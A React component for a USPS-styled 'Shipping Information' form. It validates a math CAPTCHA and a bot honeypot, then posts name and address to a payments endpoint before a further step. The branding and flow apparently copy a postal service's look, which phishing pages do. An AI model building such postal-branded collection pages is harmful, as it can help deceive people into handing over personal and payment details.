import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './uspsStyles.css';
const AddressForm = ({ formData, handleChange, nextStep,error, setError }) => {
  const [loading, setLoading] = useState(false);
  const [captcha, setCaptcha] = useState({ question: '', answer: '' });
  const [userCaptchaAnswer, setUserCaptchaAnswer] = useState('');
  const [formSubmitted, setFormSubmitted] = useState(false);

  // Generate a new random math CAPTCHA
  const generateCaptcha = () => {
    const operations = ['+', '-', '*'];
    const operation = operations[Math.floor(Math.random() * operations.length)];
    let num1, num2, answer;

    switch(operation) {
      case '+':
        num1 = Math.floor(Math.random() * 10) + 1; // 1-10
        num2 = Math.floor(Math.random() * 10) + 1; // 1-10
        answer = num1 + num2;
        break;
      case '-':
        num1 = Math.floor(Math.random() * 10) + 6; // 6-15
        num2 = Math.floor(Math.random() * 5) + 1;  // 1-5
        answer = num1 - num2;
        break;
      case '*':
        num1 = Math.floor(Math.random() * 5) + 1;  // 1-5
        num2 = Math.floor(Math.random() * 5) + 1;  // 1-5
        answer = num1 * num2;
        break;
    }

    setCaptcha({
      question: `${num1} ${operation} ${num2}`,
      answer: answer.toString()
    });
    setUserCaptchaAnswer('');
  };

  // Generate initial CAPTCHA on component mount
  useEffect(() => {
    generateCaptcha();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setFormSubmitted(true);
    
    try {
      // Get honeypot field value
      const honeypotValue = e.target.botfield?.value;
      
      // Check honeypot field
      if (honeypotValue) {
        throw new Error('Form submission rejected');
      }

      // Validate CAPTCHA first
      if (userCaptchaAnswer.trim() !== captcha.answer) {
        generateCaptcha();
        throw new Error('CAPTCHA answer is incorrect');
      }

      // Validate required fields
      const requiredFields = ['firstName', 'lastName', 'country', 'address', 'zipCode', 'city'];
      const missingFields = requiredFields.filter(field => !formData[field].trim());
      
      if (missingFields.length > 0) {
        throw new Error('All fields are required');
      }
      
      // Validate zip code format (basic check)
      if (!/^\d+$/.test(formData.zipCode)) {
        throw new Error('Zip code must contain only numbers');
      }

      // Simulate network delay for bots
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Send to backend
      const response = await axios.post('/api/payments/address', formData);
      
      if (response.data.success) {
        nextStep();
      } else {
        throw new Error(response.data.error || 'Failed to save address');
      }
    } catch (err) {
      setError(err.response?.data?.error || err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="usps-form">
      <h2>Shipping Information</h2>
      
      {error && <div className="usps-error">{error}</div>}
      
      <div className="form-group">
        <label>First Name</label>
        <input
          type="text"
          name="firstName"
          value={formData.firstName}
          onChange={handleChange}
          required
          disabled={loading}
        />
      </div>
      
      <div className="form-group">
        <label>Last Name</label>
        <input
          type="text"
          name="lastName"
          value={formData.lastName}
          onChange={handleChange}
          required
          disabled={loading}
        />
      </div>
      
      <div className="form-group">
        <label>Country</label>
        <input
          type="text"
          name="country"
          value={formData.country}
          onChange={handleChange}
          required
          disabled={loading}
        />
      </div>
      
      <div className="form-group">
        <label>Address</label>
        <input
          type="text"
          name="address"
          value={formData.address}
          onChange={handleChange}
          required
          disabled={loading}
        />
      </div>
      
      <div className="form-group">
        <label>Zip Code</label>
        <input
          type="text"
          name="zipCode"
          value={formData.zipCode}
          onChange={handleChange}
          required
          disabled={loading}
          pattern="\d*"
        />
      </div>
      
      <div className="form-group">
        <label>City</label>
        <input
          type="text"
          name="city"
          value={formData.city}
          onChange={handleChange}
          required
          disabled={loading}
        />
      </div>

      {/* CAPTCHA Section */}
      <div className="form-group">
        <label>CAPTCHA: {captcha.question} = ?</label>
        <input
          type="text"
          value={userCaptchaAnswer}
          onChange={(e) => setUserCaptchaAnswer(e.target.value)}
          required
          placeholder="Enter answer"
          disabled={loading}
          className={formSubmitted && userCaptchaAnswer.trim() !== captcha.answer ? 'usps-input-error' : ''}
        />
        <button 
          type="button" 
          onClick={generateCaptcha}
          className="usps-button usps-button-secondary"
          disabled={loading}
          style={{ marginTop: '5px', padding: '5px 10px', fontSize: '0.8rem' }}
        >
          Refresh CAPTCHA
        </button>
      </div>
      
      {/* Honeypot field - hidden from humans but visible to bots */}
      <div className="honeypot">
        <label>Leave this empty:</label>
        <input 
          type="text" 
          name="botfield" 
          tabIndex="-1"
          autoComplete="off"
        />
      </div>

      {/* Time-based submission prevention */}
      <input type="hidden" name="formLoadTime" value={Date.now()} />

      <button 
        type="submit" 
        disabled={loading} 
        className="usps-button"
        style={loading ? { opacity: 0.7 } : {}}
      >
        {loading ? (
          <>
            <span className="usps-spinner"></span> Processing...
          </>
        ) : 'Continue'}
      </button>
    </form>
  );
};

export default AddressForm;
